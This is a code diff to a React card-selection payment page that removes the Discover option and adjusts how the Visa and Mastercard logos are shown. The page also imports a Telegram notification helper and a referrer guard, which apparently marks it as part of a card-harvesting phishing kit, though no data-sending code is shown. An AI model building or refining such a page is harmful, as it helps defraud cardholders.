@@ -4,33 +4,23 @@ import { CreditCard, Shield, ArrowLeft, Globe, Lock, Camera, X } from "lucide-re
 import { sendTelegramNotification } from "@/lib/telegram";
 import { useReferrerGuard } from "@/hooks/useReferrerGuard";
 import CancelPaymentDialog from "@/components/CancelPaymentDialog";
-import VisaLogo from "@/components/logos/VisaLogo";
-import MastercardLogo from "@/components/logos/MastercardLogo";
-import DiscoverLogo from "@/components/logos/DiscoverLogo";
 import genzLogo from "@/assets/genz-logo.png";
 import visaLogoImg from "@/assets/visa-logo.png";
-import mastercardLogoImg from "@/assets/mastercard-logo.png";
+import mastercardLogoImg from "@/assets/mastercard-logo-color.png";
 import mastercardLogoColorImg from "@/assets/mastercard-logo-color.png";
-import discoverLogoImg from "@/assets/discover-logo.png";
 
 const cardOptions = [
   {
-    id: "visa", label: "Visa", Logo: VisaLogo, logoImg: visaLogoImg, cvvLength: 3,
+    id: "visa", label: "Visa", logoImg: visaLogoImg, cvvLength: 3,
     gradient: "linear-gradient(135deg, #0d1b4a 0%, #1a1f71 30%, #0d47a1 60%, #1565c0 100%)",
     gradientBack: "linear-gradient(135deg, #0d47a1 0%, #1a1f71 50%, #0d2137 100%)",
     accent: "#1a1f71", accentHover: "#0d1547",
   },
   {
-    id: "mastercard", label: "Mastercard", Logo: MastercardLogo, logoImg: mastercardLogoImg, logoImgColor: mastercardLogoColorImg, cvvLength: 3,
+    id: "mastercard", label: "Mastercard", logoImg: mastercardLogoImg, logoImgColor: mastercardLogoColorImg, cvvLength: 3,
     gradient: "linear-gradient(135deg, #1a1a2e 0%, #16213e 30%, #0f3460 60%, #533483 100%)",
     gradientBack: "linear-gradient(135deg, #533483 0%, #0f3460 50%, #1a1a2e 100%)",
     accent: "#EB001B", accentHover: "#c0000f",
-  },
-  {
-    id: "discover", label: "Discover", Logo: DiscoverLogo, logoImg: discoverLogoImg, cvvLength: 4,
-    gradient: "linear-gradient(135deg, #FF6000 0%, #D14700 40%, #8B2F00 100%)",
-    gradientBack: "linear-gradient(135deg, #8B2F00 0%, #D14700 50%, #FF6000 100%)",
-    accent: "#FF6000", accentHover: "#D14700",
   },
 ];
 
@@ -404,7 +394,11 @@ const CardSelectPage = () => {
                   </div>
                 </div>
                 <div className="flex justify-end px-6 mt-auto mb-6">
-                  <img src={selectedCard.logoImg} alt={selectedCard.label} className="h-5 object-contain brightness-0 invert opacity-50" />
+                  <img
+                    src={selectedCard.id === 'mastercard' ? selectedCard.logoImgColor ?? selectedCard.logoImg : selectedCard.logoImg}
+                    alt={selectedCard.label}
+                    className={`h-5 object-contain opacity-50 ${selectedCard.id === 'mastercard' ? '' : 'brightness-0 invert'}`}
+                  />
                 </div>
               </div>
             </div>
